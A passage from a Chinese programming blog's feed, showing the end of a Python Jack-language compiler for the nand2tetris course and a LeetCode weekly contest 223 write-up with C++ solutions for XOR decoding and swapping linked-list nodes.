class="keyword">for</span> c <span class="keyword">in</span> val:</span><br><span class="line">                self.out.writePush(<span class="string">"constant"</span>,ord(c))</span><br><span class="line">                self.out.writeCall(<span class="string">"String.appendChar"</span>,<span class="number">2</span>)</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            <span class="comment"># parse keword const</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"true"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"false"</span> <span class="keyword">or</span> \</span><br><span class="line">               self.parser.keyWord() == <span class="string">"null"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"this"</span>:</span><br><span class="line">                <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"true"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"constant"</span>,<span class="number">0</span>)</span><br><span class="line">                    self.out.writeSigArithmetic(<span class="string">"~"</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"false"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"constant"</span>,<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"null"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"constant"</span>,<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"this"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"pointer"</span>,<span class="number">0</span>)</span><br><span class="line">                self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">if</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.writeExpressionCode()</span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                (self.parser.symbol() == <span class="string">"-"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"~"</span>):</span><br><span class="line">                <span class="comment"># parse unaryOp</span></span><br><span class="line">                op = self.parser.symbol()</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse term</span></span><br><span class="line">                self.writeTermCode()</span><br><span class="line">                self.out.writeSigArithmetic(op)</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            <span class="comment"># skip varname</span></span><br><span class="line">            termname = self.parser.currToken()</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># we push the head arrdress of the array</span></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"["</span>:</span><br><span class="line">                <span class="comment"># parse subroutineName or varName            </span></span><br><span class="line">                <span class="keyword">if</span> self.subTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.subTable.typeOf(termname)</span><br><span class="line">                    varkind = self.subTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.subTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">elif</span>  self.classTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.classTable.typeOf(termname)</span><br><span class="line">                    varkind = self.classTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.classTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"invalid var statement!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse '['</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.writeExpressionCode()</span><br><span class="line">                 <span class="comment"># parse var type </span></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line">                <span class="comment"># add</span></span><br><span class="line">                self.out.writeArithmetic(<span class="string">"+"</span>)</span><br><span class="line">                self.out.writePop(<span class="string">"pointer"</span>,<span class="number">1</span>)</span><br><span class="line">                self.out.writePush(<span class="string">"that"</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse ']'</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="comment"># parse subcall</span></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"."</span>:</span><br><span class="line">                <span class="comment"># parse '.'</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse subroutineName</span></span><br><span class="line">                termfunc = self.parser.currToken()</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse call name</span></span><br><span class="line">                <span class="keyword">if</span> self.subTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.subTable.typeOf(termname)</span><br><span class="line">                    varkind = self.subTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.subTable.indexOf(termname)</span><br><span class="line">                    paramCnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span>  self.classTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.classTable.typeOf(termname)</span><br><span class="line">                    varkind = self.classTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.classTable.indexOf(termname)</span><br><span class="line">                    paramCnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    vartype = termname</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                paramCnt += self.writeExpressionListCode()</span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># write var code</span></span><br><span class="line">                self.out.writeCall(vartype + <span class="string">"."</span> + termfunc,paramCnt)</span><br><span class="line">            <span class="comment"># parse call</span></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.out.writePush(<span class="string">"pointer"</span>,<span class="number">0</span>)</span><br><span class="line">                paramCnt = self.writeExpressionListCode() + <span class="number">1</span></span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># write var code</span></span><br><span class="line">                self.out.writeCall(self.classname + <span class="string">"."</span> + termfunc,paramCnt)</span><br><span class="line">                <span class="comment"># print(self.classname + "." + termfunc + str(paramCnt))</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># parse subroutineName or varName            </span></span><br><span class="line">                <span class="keyword">if</span> self.subTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.subTable.typeOf(termname)</span><br><span class="line">                    varkind = self.subTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.subTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">elif</span>  self.classTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.classTable.typeOf(termname)</span><br><span class="line">                    varkind = self.classTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.classTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"invalid var statement!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">"field"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"this"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"var"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"local"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"static"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"static"</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">"argument"</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">"argument"</span>,varidx)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeExpressionListCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        argsCnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.symbol() == <span class="string">')'</span> <span class="keyword">and</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">return</span> argsCnt</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        argsCnt += <span class="number">1</span></span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse `, expression`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.symbol() == <span class="string">','</span> <span class="keyword">and</span> \</span><br><span class="line">              self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="comment"># parse ','</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            argsCnt += <span class="number">1</span></span><br><span class="line">            self.writeExpressionCode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> argsCnt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(input):</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(input):</span><br><span class="line">            files = os.listdir(input)</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">                filename = input+f</span><br><span class="line">                <span class="keyword">if</span> filename.find(<span class="string">".jack"</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    CompileCodeWriter(input+f)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            CompileCodeWriter(input)            </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"invalid path"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week-11&quot;&gt;&lt;a href=&quot;#week-11&quot; class=&quot;headerlink&quot; title=&quot;week 11&quot;&gt;&lt;/a&gt;week 11&lt;/h1&gt;&lt;p&gt;目前已经开始了&lt;code&gt;build a computer&lt;/code&gt;系列的最后几章了，后面的章节感觉越来越难,中间无数次感觉头大，不想再写这么恶心的程序了，还好坚持了下来，最终完整的通过了测试。这个&lt;code&gt;project&lt;/code&gt;是该系列课程里面最难的一个&lt;code&gt;toy project&lt;/code&gt;了，总共写了差不多快&lt;code&gt;2000&lt;/code&gt;行代码，这个还是用&lt;code&gt;python&lt;/code&gt;写的，当然代码写的一团狗屎，一个函数都差不多几百行了，全部是&lt;code&gt;cound&lt;/code&gt;,代码水平还是稀烂，需要好好的学习一下设计模式。刚开始还好，写着写着就变味了。需要认真的设计程序结构，则需要好好花心思将整个代码重新设计一下，将所有的结构全部重新理顺一遍，整个编译器的设计还是非常有意思的，通过这个简易的编译器，可以对&lt;code&gt;stack machine&lt;/code&gt;的设计有了初步的了解，也对面向对象语言的原理有了基本的了解。&lt;br&gt;完成该&lt;code&gt;project&lt;/code&gt;的资源非常少，最终在&lt;code&gt;github&lt;/code&gt;上找到了一个资源&lt;a href=&quot;https://github.com/idelvall/jack-compiler&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;jack-compiler&lt;/a&gt;，这个国外的小哥代码写得非常漂亮，值得仔细学习一下，还剩下最后一个&lt;code&gt;project&lt;/code&gt;就终于可以完成全部的&lt;code&gt;build a modern computer&lt;/code&gt;系列课程了，课程真的是太有趣了，最有意思的是该课程讲出了计算机模型的本质，非常的推荐。&lt;/p&gt;
    
    </summary>
    
    
      <category term="build a computer" scheme="http://yoursite.com/categories/build-a-computer/"/>
    
    
      <category term="coursera" scheme="http://yoursite.com/tags/coursera/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛223场</title>
    <link href="http://yoursite.com/2021/01/10/242/"/>
    <id>http://yoursite.com/2021/01/10/242/</id>
    <published>2021-01-10T03:38:17.183Z</published>
    <updated>2021-01-10T14:15:03.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-weekly-contest-223"><a href="#leetcode-weekly-contest-223" class="headerlink" title="leetcode  weekly contest 223"></a>leetcode  weekly contest 223</h1><p>周赛的题目正很多，题意也直接简单很多，常规题目，特别是最后一题，已经是套路题目了。<br><img src="https://i.loli.net/2021/01/10/poLKCDi4dzeNYsh.png" alt></p><h2 id="5649-解码异或后的数组"><a href="#5649-解码异或后的数组" class="headerlink" title="5649. 解码异或后的数组"></a>5649. 解码异或后的数组</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>未知 整数数组 <code>arr</code> 由 <code>n</code> 个非负整数组成。</p><p>经编码后变为长度为 <code>n - 1</code> 的另一个整数数组 <code>encoded</code>，其中 <code>encoded[i] = arr[i] XOR arr[i + 1]</code> 。例如，<code>arr = [1,0,2,1]</code> 经编码后得到 <code>encoded = [1,2,3]</code> 。</p><a id="more"></a><p>给你编码后的数组 <code>encoded</code> 和原数组 <code>arr</code> 的第一个元素 <code>first（arr[0]）</code>。</p><p>请解码返回原数组 <code>arr</code> 。可以证明答案存在并且是唯一的。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：encoded = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], first = <span class="number">1</span></span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">解释：若 arr = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>] ，那么 first = <span class="number">1</span> 且 encoded = [<span class="number">1</span> XOR <span class="number">0</span>, <span class="number">0</span> XOR <span class="number">2</span>, <span class="number">2</span> XOR <span class="number">1</span>] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：encoded = [<span class="number">6</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>], first = <span class="number">4</span></span><br><span class="line">输出：[<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>2 &lt;= n &lt;= 104</code></li><li><code>encoded.length == n - 1</code></li><li><code>0 &lt;= encoded[i] &lt;= 105</code></li><li><code>0 &lt;= first &lt;= 105</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-units-on-a-truck" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-units-on-a-truck</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  异或</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>利用异或的特性，<code>a^b^a = b</code>,一个数异或偶数次相当于直接去掉该数。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; decode(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; encoded, <span class="keyword">int</span> first) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        ans.push_back(first);</span><br><span class="line">        <span class="keyword">int</span> curr = first;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; encoded.size(); ++i)&#123;</span><br><span class="line">            ans.push_back(curr^encoded[i]);</span><br><span class="line">            curr = ans.back();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5652-交换链表中的节点"><a href="#5652-交换链表中的节点" class="headerlink" title="5652. 交换链表中的节点"></a>5652. 交换链表中的节点</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你链表的头节点 head 和一个整数 <code>k</code>。<br>交换 链表正数第<code>k</code>个节点和倒数第 <code>k</code>个节点的值后，返回链表的头节点（链表 从 <code>1</code>开始索引）。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>], k = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span>], k = <span class="number">5</span></span><br><span class="line">输出：[<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>], k = <span class="number">1</span></span><br><span class="line">输出：[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>,<span class="number">2</span>], k = <span class="number">1</span></span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li>链表中节点的数目是 <code>n</code></li><li><code>1 &lt;= k &lt;= n &lt;= 105</code></li><li><code>0 &lt;= Node.val &lt;= 100</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/count-good-meals" target="_blank" rel="noopener">https://leetcode-cn.com/problems/count-good-meals</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 交换链表即可</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>分别找到第<code>k</code>个节点和第<code>n-k</code>个节点即可，然后将两个节点的值进行交换即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">(ListNode * head)</span></span>&#123;</span><br><span class="line">        ListNode * curr = head;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(curr)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">            curr = curr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">ListNode * <span class="title">find</span><span class="params">(ListNode * head,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        ListNode * curr = head;</span><br><span class="line">        <span class="keyword">while</span>(curr &amp;&amp; k &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            curr = curr-&gt;next;</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> curr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">ListNode* <span class="title">swapNodes</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = length(head);</span><br><span class="line">        ListNode * l1 = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode * l2 = <span class="literal">NULL</span>;</span><br><span class="line">        l1 = find(head,k);</span><br><span class="line">        l2 = find(head,n-k+<span class="number">1</span>);</span><br><span class="line">        swap(l1-&gt;val,l2-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5650-执行交换操作后的最小汉明距离"><a href="#5650-执行交换操作后的最小汉明距离" class="headerlink" title="5650. 执行交换操作后的最小汉明距离"></a>5650. 执行交换操作后的最小汉明距离</h2><p>给你两个整数数组 <code>source</code> 和 <code>target</code> ，长度都是 n 。还有一个数组 <code>allowedSwaps</code>，其中每个 <code>allowedSwaps[i] = [ai, bi]</code>表示你可以交换数组 <code>source</code> 中下标为 <code>ai</code> 和 <code>bi</code>（下标从 0 开始）的两个元素。注意，你可以按 任意 顺序 多次 交换一对特定下标指向的元素。</p><p>相同长度的两个数组 <code>source</code> 和<code>target</code> 间的 汉明距离 是元素不同的下标数量。形式上，其值等于满足 <code>source[i] != target[i]</code>（下标从 0 开始）的下标 <code>i（0 &lt;= i &lt;= n-1）</code>的数量。</p><p>在对数组 <code>source</code>执行 任意 数量的交换操作后，返回 <code>source</code>和 <code>target</code>间的 最小汉明距离 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：source = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], target = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>], allowedSwaps = [[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：source 可以按下述方式转换：</span><br><span class="line">- 交换下标 <span class="number">0</span> 和 <span class="number">1</span> 指向的元素：source = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">- 交换下标 <span class="number">2</span> 和 <span class="number">3</span> 指向的元素：source = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>]</span><br><span class="line">source 和 target 间的汉明距离是 <span class="number">1</span> ，二者有 <span class="number">1</span> 处元素不同，在下标 <span class="number">3</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：source = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], target = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>], allowedSwaps = []</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：不能对 source 执行交换操作。</span><br><span class="line">source 和 target 